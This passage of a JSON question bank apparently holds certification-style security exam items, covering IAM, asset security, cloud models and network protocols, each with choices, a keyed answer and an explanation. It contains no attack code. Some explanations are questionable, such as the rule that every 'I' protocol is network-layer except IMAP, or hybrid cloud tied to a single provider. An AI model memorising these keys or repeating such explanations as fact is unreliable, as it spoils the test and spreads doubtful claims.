      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 1 is correct. Certificate stapling is an extension of OCSP and is the process of verifying the authenticity of digital certificates in real time. Moreover, it provides signed and timestamped responses on the status of digital certificates to the communicating entities. Option 2 is not correct because OCSP provides real-time digital certificate verification but does not provide signed and timestamped feedback to entities from the web server. A CRL provides the status of digital certificates but not in real time, hence option 3 is incorrect. A CPS is a document that states entities and their role in Public Key Infrastructure (PKI) but does not provide the status of certificates, thus option 4 is incorrect."
    },
    {
      "id": "d5-q83",
      "domain": "5. Identity and Access Management (IAM)",
      "stem": "A business has been conducting different user security awareness training to improve the behavior of the users in protecting their credentials. However, according to the recent assessment report, some users are still using the same credential to access the applications. The business is worried about credential stuffing and password spraying attacks as a result and plans to employ controls. Which option would provide the BEST protection against the attacks?",
      "choices": [
        "Web Application Firewall (WAF)",
        "Strong passwords",
        "Completely Automated Public Turing test to tell Computers and Humans Apart (CAPTCHA)",
        "Multifactor Authentication (MFA)"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct. MFA is the best security control against password spraying and credential staffing attacks in the organization. WAF solutions may provide limited protection against the attacks but they are not as effective as MFA, thus option 1 is incorrect. Passwords are the weakest controls to protect the organization from the mentioned attacks, hence option 2 is incorrect. CAPTCHA may protect the organization from the mentioned attacks but it is secondary to MFA and therefore option 3 is incorrect."
    },
    {
      "id": "d5-q84",
      "domain": "5. Identity and Access Management (IAM)",
      "stem": "An attacker recently compromised the credentials of an enterprise and gained unauthorized access to sensitive data. The attacker used large databases of precomputed hash values, commonly known as rainbow tables, to shorten the time to crack the credentials. What would have been the BEST protection against the attacks outlined in the scenario?",
      "choices": [
        "Strong encryption algorithms",
        "Combine the password with a unique large random number",
        "Strong passwords",
        "Passphrases"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct. Combining the password with unique and large random numbers, also known as the salting technique, is the best protection against attacks that occur due to precomputed hash values in rainbow tables. Strong encryption and hashing algorithms can be good choices but they are not as effective as salting practices, thus option 1 is incorrect. Strong passwords will still be vulnerable to rainbow table attacks unless salt and pepper are properly added to the hash value of the passwords. Hence, option 3 is not correct as well. Passphrases, like passwords, will be vulnerable to rainbow table attacks and therefore option 4 is incorrect."
    },
    {
      "id": "d3-q77",
      "domain": "3. Security Architecture and Engineering",
      "stem": "Alice uses her badge and pin code to enter a secure computer data center. A man entering behind her asks her to hold the door for him. Given the situation, how should Alice proceed?",
      "choices": [
        "Ask to see the man’s badge and hold the door",
        "Report the man to security",
        "Allow the man to enter if she recognizes him",
        "Ask the man to separately use his badge and key code to enter"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct. Tailgating is a common form of attempting to gain access to a secure facility by bypassing access controls installed at points of entry. Staff should be trained to ensure all people who enter secure facilities use the proper access control procedures. Even if an employee recognizes another employee from previous encounters, their access or employment status may have changed. Each person accessing a facility should use their unique credentials upon entering."
    },
    {
      "id": "d3-q78",
      "domain": "3. Security Architecture and Engineering",
      "stem": "A secure facility is designed so that staff must use an ID card and a PIN to enter a small space and then use their ID card and pin to enter through a second door once the first one locks. This physical access control is referred to as a ___?",
      "choices": [
        "Restricted access area",
        "Secured entrance",
        "Vestibule",
        "Mantrap"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct. The term mantrap is used to define a secured space in which a person must enter and lock an outer door before the subsequent door will open. Unlike one vestibule opening into another, adding a mantrap to a secure facility design can provide an added layer of access control to secure areas and prevent tailgaters."
    },
    {
      "id": "d2-q55",
      "domain": "2. Asset Security",
      "stem": "An enterprise plans to develop a data classification scheme in order to identify assets and select cost-effective security controls to safeguard each asset. Senior management, in consultation with the information security manager and Chief Information Security Officer (CISO), has formulated the classification structure to be \"confidential,\" \"private,\" \"sensitive,\" and \"public.\" Who is PRIMARILY responsible for assigning sensitivity levels to the data as per the new structure?",
      "choices": [
        "Chief Information Security Officer (CISO)",
        "Data owner",
        "Information security manager",
        "Senior management"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct. The data owner is responsible for assigning sensitivity level to the data and classifying it in accordance with the data classification structure. Option 1 is incorrect. The CISO may be involved in assigning data classification and determining sensitivity levels, but not as directly as the data owner. Option 3 is incorrect. The information security manager will develop and ratify the data classification schemes and programs but will not be responsible for assigning sensitivity levels and classifying data. Option 4 is incorrect. Senior management in general is responsible for making sure that data is classified as per its sensitivity."
    },
    {
      "id": "d2-q56",
      "domain": "2. Asset Security",
      "stem": "An enterprise has a data classification program established to protect its sensitive and critical data from security risks, threats, and vulnerabilities. The program has enabled the enterprise to choose the security controls necessary to ensure the Confidentiality, Integrity, and Availability (CIA) of the data. Furthermore, the enterprise plans to develop a data categorization program on top of the data classification to enhance the protection of its valuable data. What is the PRIMARY objective of the data categorization process in the enterprise?",
      "choices": [
        "Apply similar safeguards to data with similar sensitivity levels",
        "Mark and label each asset",
        "Reduce risk to assets to an acceptable level",
        "Determine the security controls necessary to protect the data"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 1 is correct. Once data is classified, organizations may categorize it to enforce similar security controls on data with similar sensitivity levels. Option 2 is incorrect. Marking and labeling are elements of the data classification process, which focuses on uniquely identifying physical or electronic assets. Option 3 is incorrect. Reducing risk to an acceptable level is the role of risk management in an organization, not that of data categorization. Option 4 is incorrect. Selecting appropriate security controls to protect the data occurs because of risk assessment programs in the organization, not as a result of the data categorization process."
    },
    {
      "id": "d2-q57",
      "domain": "2. Asset Security",
      "stem": "An enterprise stores sensitive data in its on-premise server, workstations, removable media, mobile devices, and in the cloud to improve the availability of services. However, the newly hired Chief Information Security Officer (CISO) is concerned about the security of the data and wants to classify the data and establish control. Which option would be the BEST option to address the concerns of the CISO?",
      "choices": [
        "Data classification",
        "Business Continuity/Disaster Recovery (BC/DR) plan",
        "Data encryption",
        "Data backup"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct. The primary control to secure the data in storage will be strong encryption techniques. Option 1 is incorrect. Classifying the data as per its sensitivity level and value to the organization will be helpful to choose the appropriate security controls to safeguard it. However, it will not be adequate to ensure the security of the sensitive data by itself. Option 2 is incorrect. A BC/DR plan is established mainly to ensure the availability of services but not to address the security concerns of the data. Data backup would be the best strategy to restore and rebuild sensitive data if it is compromised or lost. However, Option 4 is not correct because the data in the backup media still needs to be protected through various security controls, including encryption."
    },
    {
      "id": "d2-q58",
      "domain": "2. Asset Security",
      "stem": "A business handles and processes the Personally Identifiable Information (PII) of individuals. The software engineer of the business exports and imports the sensitive data to use it in a development platform and test some functional requirements. However, the business wants to remove any information that may be used to compromise the privacy of individuals when the dataset is shared with the software engineer. Which option would PRIMARILY enable the business to protect the confidentiality of sensitive data?",
      "choices": [
        "Data Loss Prevention (DLP)",
        "Data de-identification",
        "Tokenization",
        "Data declassification"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct. Data de-identification or anonymization is the best technique to avoid the Personally Identifiable Information (PII) of individuals being exposed when the dataset is shared with the engineer. Option 1 is incorrect. DLP is a security control that organizations employ to prevent intentional or inadvertent leakage of sensitive data. DLP may be an additional layer to protect PII, but it will not be the primary option to protect sensitive data. Option 3 is not correct because tokenization is the process of replacing sensitive data elements with non-sensitive characters or numbers and it is one form of data anonymization. Option 4 is not correct because data declassification mainly deals with lowering the classification level of an asset as a whole and not specific datasets in a given asset."
    },
    {
      "id": "d2-q59",
      "domain": "2. Asset Security",
      "stem": "An enterprise is planning to identify the security weaknesses of its physical and virtual assets. It wants to classify and deploy a cost-effective control to protect each asset afterward. Moreover, the safeguards will be applied based on the value of the assets to the enterprise. Senior management has directed the information security manager to start developing the program immediately. Which option should be the FIRST task of the manager to address the requirements of the enterprise?",
      "choices": [
        "Data classification",
        "Vulnerability assessment",
        "Risk assessment",
        "Asset inventory"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct. Asset inventory takes precedence before classifying the assets and employing any security controls. Option 2, vulnerability assessment, is incorrect because it happens after performing a comprehensive asset inventory. Option 1 is incorrect. Data classification occurs after a comprehensive asset inventory is conducted in the organization, thus it cannot be the first task of the manager. Option 3 is not correct as risk assessment comes right after inventorying each asset to identify security weaknesses and threats to the assets. The organization will then act to safeguard the asset according to the severity of the risk and value of the asset."
    },
    {
      "id": "d2-q60",
      "domain": "2. Asset Security",
      "stem": "An enterprise signs a contractual agreement with a Managed Security Service Provider (MSSP) to protect some of its data assets. As per the agreement, the enterprise outsources the data backup and storage requirements to the service provider to focus on its main business functions. Who is ULTIMATELY responsible and liable for the security of the outsourced data?",
      "choices": [
        "Managed Security Service Provider (MSSP)",
        "Data processor",
        "Data owner",
        "Data controller"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct. The data owner of the outsourcing organization is ultimately responsible and accountable for the security of the data wherever it resides, be it on the cloud or on-premises. Option 1 is incorrect. The MSSP will share some responsibility for protecting the data as per the Service-Level Agreement (SLA), but it will not be ultimately responsible for protecting the data. Option 2 is not correct as the data processor is a party responsible for handling data on behalf of the data owner and therefore the responsibility lies with the data owner. Option 4 is incorrect. The data controller may sometimes be the data owner and is responsible for determining the purpose and mechanism of the data processing, but they are not ultimately responsible for the data."
    },
    {
      "id": "d2-q61",
      "domain": "2. Asset Security",
      "stem": "An enterprise's server that stores highly sensitive data is not functioning optimally and has to be replaced. The business decides to donate it to a nearby charity after performing a proper sanitization process. However, the data destruction team only applies deletion commands of the operating system to clear the data. A malicious insider in the charity suspects that the server may contain sensitive information and extracts it by employing data deconstruction techniques. What is the MOST probable cause of the security incident?",
      "choices": [
        "Data remanence",
        "Improper data sanitization process",
        "Poor data classification structure",
        "Lack of due diligence"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 1 is correct. No matter the media sanitization process, there will always exist remnants of data when handing over media that was used to store sensitive information. Therefore, such devices should never be donated in the first place because employing even the best sanitization techniques would not completely remove the data remanence. This makes option 2 incorrect as well. The best sanitization technique would be the physical destruction of the media by breaking it into small pieces. Option 3 is not correct because even with proper classification and declassification schemes, there would still be a residual risk due to the data remanence. Lack of due diligence would be a factor but not the primary reason, so option 4 is incorrect."
    },
    {
      "id": "d2-q62",
      "domain": "2. Asset Security",
      "stem": "An enterprise generates a huge volume of data each day and purges it annually without taking proper data archives to save disk space. Due to the enactment and enforcement of new regulatory laws in the jurisdiction in which it operates, it is required to present an independent audit report about sensitive data that dates back six years. However, the enterprise does not store data for that long and is facing litigation for noncompliance. Which option would have SAVED the enterprise from the lawsuit?",
      "choices": [
        "Asset management",
        "Asset retention",
        "Asset inventory",
        "Asset classification"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct. The process of maintaining sensitive information for a reasonable period of time and purging it when no longer required is an asset retention issue. This means an asset retention policy would have helped the organization reduce liability. Option 1 is not correct as asset management that lacks a proper asset retention strategy would not protect the organization from litigation. Both options 3 and 4 are incorrect, as asset inventory and classification are internal issues and would have little significance in protecting the organization from a lawsuit. Asset inventory and classification are important prerequisites for data retention but are not the primary processes to be employed to save the organization from legal consequences."
    },
    {
      "id": "d2-q63",
      "domain": "2. Asset Security",
      "stem": "A business hosts a couple of hardware and software products in its datacenter that are nearing their End of Life (EOL), End of Development (EOD), and End of Support (EOS). Due to a budget constraint, the senior management of the enterprise wants to prioritize and replace the products one after the other. What MUST be the order of replacement for the products?",
      "choices": [
        "End of Development (EOD) 🡪 End of Support (EOS) 🡪 End of Life (EOL)",
        "End of Life (EOL) 🡪 End of Development (EOD) 🡪 End of Support (EOS)",
        "End of Life (EOL) 🡪 End of Support (EOS) 🡪 End of Development (EOD)",
        "End of Support (EOS) 🡪 End of Life (EOL) 🡪 End of Development (EOD)"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct. The correct order of product replacement is End of Support (EOS) 🡪 End of Life (EOL) 🡪 End of Development (EOD). Option 2 is incorrect. The organization should be worried the most about products that are nearing EOS. This is because even if a product reaches its EOL, the company will still provide support for its customers. Option 3 is incorrect. In addition, even if a product reaches its EOD (is no longer developed), the company may continue to distribute or sell the product from available stock for a limited time. Option 1 is incorrect. However, if a product reaches its EOS, there is nothing left for the organization to look for from the vendor, except internal expertise. The organization should therefore replace products nearing EOS first."
    },
    {
      "id": "d2-q64",
      "domain": "2. Asset Security",
      "stem": "A financial institution uses different security controls to prevent transactional fraud. It employs Multifactor Authentication (MFA), Role-Based Access Control (RBAC), and encryption techniques to deal with fraudulent transactions by malicious insiders. The institution has further designed and implemented Separation of Duties (SoD) to enforce stronger accountability and auditing in all transactions. What control is the institution PRIMARILY applying through the implementation of SoD?",
      "choices": [
        "Administrative control",
        "Technical control",
        "Compensating control",
        "Detective control"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct. Compensating controls may augment existing controls or replace them to achieve control objectives. Option 2 is incorrect. Technical control refers to technology-related security controls such as encryption, firewalls, and authentications, and SoD is not a technical control. Option 1 is incorrect. Administrative controls are types of security controls that organizations establish through policies, procedures, standards, and guidelines. Administrative controls include SoD principles, but the SoD is implemented as a compensating control to complement the other controls to prevent fraud. Option 4 is incorrect. SoD may help the organization to detect fraudulent transactions, but SoD is not a type of detective control; it is, rather, a preventive, compensating control."
    },
    {
      "id": "d3-q79",
      "domain": "3. Security Architecture and Engineering",
      "stem": "An Operating System (OS) grants or denies users access to its resources and core components based on their operating modes. To enforce this, most modern operating systems use concentric rings known as protection rings to organize and secure their resources. The protection rings range from Ring 0 through Ring 3. Access privileges to the OS resources depend on the protection ring the user is assigned to. Access to which of the layers of the OS would denote having the HIGHEST privilege?",
      "choices": [
        "Ring 3",
        "Ring 0",
        "Ring 2",
        "Ring 1"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct. Users in Ring 0, sometimes known as the kernel level, have the highest level of privilege and can access any resources of the OS. Option 4 is incorrect. Users in Ring 1 will only have privileges to access OS components other than the OS kernel. Option 3 is incorrect. Users in Ring 2 will be able to access OS drivers, protocols, and the like, but do not have the highest level of privilege. Option 1 is not correct because users in Ring 3 will only have privileges to access installed programs and applications in the OS. Besides, users in Ring 3 have the least privileges of the protection rings of the OS."
    },
    {
      "id": "d3-q80",
      "domain": "3. Security Architecture and Engineering",
      "stem": "A business wants to adopt cloud computing to host its on-premises development and test environments. The business specifically wants resources such as computing, storage, and networking infrastructure integrated with the software stack, database management systems, libraries, development frameworks, and tools to avoid the cost of buying and managing software licenses. Which option would BEST meet the requirements outlined in the scenario?",
      "choices": [
        "Software as a Service (SaaS)",
        "Infrastructure as Code (IaC)",
        "Platform as a Service (PaaS)",
        "Infrastructure as a Service (IaaS)"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct. PaaS is a cloud service model that offers DBMS software, libraries, development tools, and a test environment for cloud consumers or developers. Option 1 is incorrect. SaaS is a model where the Cloud Service Provider (CSP) offers a fully functional application or software such as Gmail, Facebook, and LinkedIn. Option 2 is not correct as IaC is a tool that enables developers to view and manipulate their IT platforms directly from lines of code using automated and orchestrated programming and configuration languages such as Ansible, Puppet, and Chef. IaaS is a model where the Cloud Service Provider (CSP) offers compute, storage, networking, and related infrastructure resources to its customers. However, IaaS, in option 4, does not provide an operating system, development frameworks, tools, libraries, etc. to cloud consumers like PaaS."
    },
    {
      "id": "d3-q81",
      "domain": "3. Security Architecture and Engineering",
      "stem": "An enterprise currently stores and processes both its sensitive and insensitive data and services in its on-premises cloud-based datacenter. However, the enterprise has decided to host less sensitive data and services in the datacenters of public Cloud Service Providers (CSPs). The enterprise primarily made the decision to avoid vendor lock-in and dependency on a single CSP and reduce cloud migration requirements. What best meets the situation outlined in the scenario?",
      "choices": [
        "Public cloud",
        "Private cloud",
        "Hybrid",
        "Multi-cloud"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct. A multi-cloud deployment model may include a combination of public and private clouds, like a hybrid model, but relies on more than one public Cloud Service Provider (CSP). Option 3 is incorrect. A hybrid cloud combines services from two or more cloud models but from a single public Cloud Service Provider (CSP). Option 1 is not correct as a public cloud is a cloud deployment model where services, applications, and infrastructures are shared among multiple organizations or the general public. Unlike the public cloud, the private cloud is a model where cloud services are only available to members of a single organization and thus option 2 is incorrect."
    },
    {
      "id": "d4-q67",
      "domain": "4. Communication and Network Security",
      "stem": "An enterprise wants to deploy an isolated environment to lure attackers away from its live networks. The enterprise further wants to proactively monitor and investigate its attack techniques and deploy security controls. Which option would MOST LIKELY meet the requirements of the enterprise?",
      "choices": [
        "Bastion host",
        "Firewall",
        "Demilitarized Zone (DMZ)",
        "Honeypot"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct. A honeypot is a false network employed to trap intruders attempting to gain unauthorized access to the systems or networks of an organization. Option 1 is not correct because the bastion host is the first layer of protection in a defense-in-depth architecture and is mostly deployed behind critical network resources or in a DMZ. Option 2 is incorrect. Unlike a honeypot, a firewall is a real architecture deployed to prevent the unauthorized flow of data from secure networks to less secure environments, such as the internet. Option 3 is not correct as a DMZ is used to place externally accessible systems such as web, email, and DNS servers with some level of protection."
    },
    {
      "id": "d4-q68",
      "domain": "4. Communication and Network Security",
      "stem": "An enterprise wants to segment its highly critical systems and public-facing services. In order to achieve this requirement, the business wants to choose a firewall deployment architecture that can separate the two segments and protect the assets. Which option would be the MOST secure architecture to protect the enterprise?",
      "choices": [
        "Dual-homed firewall",
        "Screened host",
        "Screened subnet",
        "Bastion host"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct. A screened subnet operates as a buffer network between the secured private network and the internet. It is the most secure architecture because it includes two packet-filtering routers and a bastion host. Option 1 is not correct because a dual-homed firewall contains one public-facing packet-filtering router and one bastion host with two Network Interface Cards (NICs) and is less secure than a screened subnet. Option 2 is not correct as a screened host includes only one packet-filtering firewall and one bastion host. Option 4 is not correct because a screened subnet is a combination of bastion hosts and this makes it more secure than a single bastion host."
    },
    {
      "id": "d4-q69",
      "domain": "4. Communication and Network Security",
      "stem": "A business plans to upgrade its existing network architecture and adopt a converged protocol to virtualize the entire network. Moreover, it wants to abstract and separate the forwarding and switching tasks. Which option would be the BEST alternative?",
      "choices": [
        "Software-Defined Data Center (SDDC)",
        "Software-Defined Networking (SDN)",
        "Network Functions Virtualization (NFV)",
        "Content Delivery Networking (CDN)"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct. SDN separates the control plane and data forwarding plane by centralizing the control and programmability of the network and thereby abstracts and virtualizes the entire networking infrastructure. Option 1 is not correct because, unlike SDN, the SDDC abstracts and virtualizes compute, network, storage, management, and other computing resources and delivers each as software. Option 3 is not correct as NFV virtualizes and abstracts networking functionalities, but unlike SDN, NFV runs on standard x86 servers instead of network appliances. CDN involves a collection of data centers, proxy servers, and resource services geographically distributed to provide low latency, high performance, and high availability of content, thus making option 4 incorrect."
    },
    {
      "id": "d4-q70",
      "domain": "4. Communication and Network Security",
      "stem": "A business is currently using complex traditional Internet Protocol (IP) address-based routing processes and infrastructure. However, the business wants to change to a high-throughput and high-performance networking infrastructure. Moreover, the business wants a technology that directs traffic across the network infrastructure through short path labels instead of longer network IP addresses. Which option MOST LIKELY meets the needs of the business outlined in the scenario?",
      "choices": [
        "Multiprotocol Label Switching (MPLS)",
        "Fibre Channel over Ethernet (FCoE)",
        "Internet Small Computer System Interface (iSCSI)",
        "Voice over Internet Protocol (VoIP)"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 1 is correct. MPLS is a converged protocol designed to improve the routing speed of high-performance network architectures. Option 2 is not correct because FCoE provides Fibre Channel communications to network data-storage options through an existing copper cables-based Ethernet network infrastructure rather than expensive fiber-optic cables. Option 3 is not correct as iSCSI is an IP-based connection rather than based on labels. Option 4 is not correct because VoIP encapsulates voice communications and multimedia sessions over IP network infrastructures rather than short path labels."
    },
    {
      "id": "d4-q71",
      "domain": "4. Communication and Network Security",
      "stem": "An enterprise has a corporate network that enables local users to store and share information internally. The enterprise further wants to securely exchange information with its customers, vendors, and stakeholders through a web portal. What TYPE of network should the enterprise establish to connect with its partners?",
      "choices": [
        "Wide Area Network (WAN)",
        "Internet network",
        "Extranet network",
        "Intranet network"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct. An extranet network is established to create a secure connection between an organization and its external partners. Option 1 is not correct because the organization does not need to create a WAN network just to connect with its customers, vendors, and partners. Option 2 is not correct as sharing organizational information through the internet will be less secure. Option 4 is not correct because an intranet connection is established to enable users to securely share information internally within an organization."
    },
    {
      "id": "d4-q72",
      "domain": "4. Communication and Network Security",
      "stem": "An enterprise plans to automatically assign IP addresses to every host through a Dynamic Host Configuration Protocol (DHCP) leasing process. Which option is the CORRECT order of the DHCP leasing process?",
      "choices": [
        "Discover 🡪 Request 🡪 Acknowledge 🡪 Offer",
        "Request 🡪 Discover 🡪 Offer 🡪 Acknowledge",
        "Request 🡪 Offer 🡪 Discover 🡪 Acknowledge",
        "Discover 🡪 Offer 🡪 Request 🡪 Acknowledge"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct. DHCP enables the organization to automatically assign an IP address to each host connected to its network. In DHCP configuration, the client boots and broadcasts a DHCP \"discover\" message, and the server responds and returns a DHCP \"offer\" message. Then the client chooses the first DHCP offer it retrieves and sends a DHCP \"request\" accepting proper network information from that DHCP server. And finally, the server sends a DHCP \"acknowledgement (ACK).\" Options 1, 2, and 3 are therefore incorrect choices."
    },
    {
      "id": "d4-q73",
      "domain": "4. Communication and Network Security",
      "stem": "An enterprise wants to ensure that all the Voice over IP (VoIP) communications of its employees are secure. Moreover, the enterprise wants to establish a mechanism to minimize VoIP exploitations after a secure initialization is created. What protocol MUST the enterprise employ to achieve the situation described in the scenario?",
      "choices": [
        "Secure Real-Time Transport Protocol (SRTP)",
        "Session Initialization Protocol Secure (SIPS)",
        "Transport Layer Security (TLS)",
        "Hypertext Transfer Protocol Secure (HTTPS)"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 1 is correct. SRTP is the secure version of RTP and better protects an organization from VoIP-based exploitations after a secure initialization session is created by SIPS. Option 2 is not correct as SIPS is used to create secure initializations of VoIP sessions and SRTP takes over after the creation of the secure session. Option 3 is not correct because TLS will be applied only when the secure initialization session is created. HTTPS is HTTP running over a TLS connection and it is commonly used to establish a secure connection in web environments but not in VoIP, thus making option 4 incorrect."
    },
    {
      "id": "d4-q74",
      "domain": "4. Communication and Network Security",
      "stem": "A Cloud Service Provider (CSP) cloud only creates a maximum of 4,094 network segments in a domain. As a result, the CSP is looking for a network virtualization technology to segment their large networks up to 16 million logical segments. Which option would BEST enable the enterprise to create the number of segments outlined in the scenario?",
      "choices": [
        "OpenFlow protocol",
        "Software-Defined Networking (SDN)",
        "Network Functions Virtualization (NFV)",
        "Virtual eXtensible Local Area Network (VXLAN)"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct. VXLAN-based virtualization technology would enable the organization to extend the number of segments from 4,094 VLANs to 16 million VXLANs. Option 1 is not correct as the OpenFlow protocol is an open protocol that enables the programmability of an SDN controller, but unlike VXLAN, it has nothing to do with extending network segments. Option 2 is not correct because SDN enables the network of the organization to be programmatically managed but does not directly involve extending the number of segments. NFV replaces network hardware with virtual machines but it does not directly involve extending the number of segments in the organization, which makes option 3 incorrect."
    },
    {
      "id": "d4-q75",
      "domain": "4. Communication and Network Security",
      "stem": "A business plans to deploy a firewall to manage, control, and filter inbound and outbound network traffic based on defined Access Control Lists (ACLs). The business stores and processes highly sensitive data and wants to install a firewall to protect the data when it traverses the network. Which option would be the MOST secure type of firewall to deploy in the business?",
      "choices": [
        "Stateful inspection firewalls",
        "Application-level firewalls",
        "Packet-filtering firewalls",
        "Circuit-level firewalls"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct. Application-level firewalls are the most secure type of firewalls as they work on the application layer of the OSI reference model. Option 1 is not correct because a stateful inspection firewall operates at layers 3 and 4 of the OSI model and is less secure than the application-level firewall. Option 3 is not correct as a packet-filtering firewall operates at layer 3 and is the least secure type of firewall. A circuit-level firewall functions at layer 5 (session) of the OSI model and it is less secure than an application-level firewall, thus making option 4 incorrect."
    },
    {
      "id": "d4-q76",
      "domain": "4. Communication and Network Security",
      "stem": "An enterprise has a large enterprise network and wants to strictly enforce security policies across all users and devices of the network infrastructure and remote users. The enterprise is particularly looking for a solution that unifies endpoint security, the authentication of entities, and network security to protect assets hosted on-premises and on the cloud. Which option MOST LIKELY fulfills the requirements of the enterprise?",
      "choices": [
        "Multifactor Authentication (MFA)",
        "Network Access Control (NAC)",
        "Zero Trust Network Access (ZTNA)",
        "Endpoint Detection Response (EDR)"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct. ZTNA gives the organization the assurance and confidence that only trusted and validated entities are able to access sensitive data stored locally and on the cloud through granular policy enforcement. Option 1 is not correct because MFA is an authentication technique that uses two or more factors, but it is not concerned with the enforcement of security policies. Option 2 is not correct as NAC is secondary to ZTNA and it falls short of enforcing security policies across all internal and remote entities. Option 4 is not correct because EDR monitors the activities of endpoint entities in the organization but is not concerned with enforcing security policies."
    },
    {
      "id": "d4-q77",
      "domain": "4. Communication and Network Security",
      "stem": "Different protocols operate in the network layer (layer 3) of the OSI reference model. Which option is NOT a network layer protocol?",
      "choices": [
        "Internet Message Access Protocol (IMAP)",
        "Internet Control Message Protocol (ICMP)",
        "Internet Group Management Protocol (IGMP)",
        "Internetwork Packet Exchange (IPX)"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 1 is correct. IMAP operates at the application layer and not at the network layer. All protocols that start with the letter \"I\" operate at the network layer except IMAP. Option 2 is not correct because ICMP is a protocol that operates at the network layer. Option 3 is not correct since IGMP is one of the protocols of the network layer used in multicasting processes. Option 4 is not correct because IPX operates at the network layer of the OSI reference model."
    },
    {
      "id": "d4-q78",
      "domain": "4. Communication and Network Security",
      "stem": "Users in an enterprise connect to a centralized control authority through access points to get internet access and share documents. The central control authority prevents devices from interacting directly with the wireless network. Which option is PRIMARILY demonstrated in this scenario?",
      "choices": [
        "Ad hoc mode",
        "Wired extension",
        "Enterprise extended",
        "Infrastructure mode"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct. Infrastructure mode is a wireless deployment mode that enforces restrictions on connecting devices or Network Interface Cards (NICs). Option 1 is not correct because ad hoc mode or peer-to-peer Wi-Fi allows wireless devices to connect to the network without a centralized control authority. Option 2 is not correct as wired extension is a variant of infrastructure mode and infrastructure mode is a more inclusive option than wired extension. Enterprise extended is also a variant of infrastructure mode, used for large physical areas with the same wired networks, thus making option 3 incorrect."
    },
    {
      "id": "d4-q79",
      "domain": "4. Communication and Network Security",
      "stem": "An enterprise wants to establish Virtual Private Network (VPN) links between its headquarters and its branch offices. The enterprise further requires authentication, integrity, and confidentiality services for data when traversing the network layer. Which option is the MOST secure protocol or standard to protect data while in transit?",
      "choices": [
        "Advanced Encryption Standard (AES)",
        "Internet Protocol Security (IPSec)",
        "Transport Layer Security (TLS)",
        "Layer 2 Tunneling Protocol (L2TP)"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct. IPSec is a suite of protocols that provides authentication, integrity, and confidentiality of data while in motion. Option 1 is not correct because AES is a strong encryption standard that provides confidentiality of data at rest but does not provide integrity and authentication services. Option 3 is not correct as TLS operates in the transport layer of the OSI model even though it provides authentication, integrity, and confidentiality of data sent through the internet or the web. Option 4 is not correct because it does not provide confidentiality and strong authentication as IPSec does."
    },
    {
      "id": "d4-q80",
      "domain": "4. Communication and Network Security",
      "stem": "An enterprise wants to deploy a routing protocol that selects the path that has the lowest total metric such as bandwidth consumption and throughput to reach the destination. What type of protocol is MOST LIKELY described in the scenario?",
      "choices": [
        "Distance-vector protocol",
        "Open Shortest Path First (OSPF) protocol",
        "Link-state protocol",
        "Routing Information Protocol (RIP)"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "option 3 is correct. Link-state routing protocols gather routing information such as speed and latency to determine the most efficient path. Option 1 is incorrect. Unlike link-state protocols, distance-vector protocols select the best path based on the distance metric or the number of hops and the interface or the vector rather than the total metric. OSPF is an instance of the link-state routing protocol and hence option 2 is incorrect. RIP is an instance or example of a distance-vector protocol, thus making option 4 incorrect."
    },
    {
      "id": "d4-q81",
      "domain": "4. Communication and Network Security",
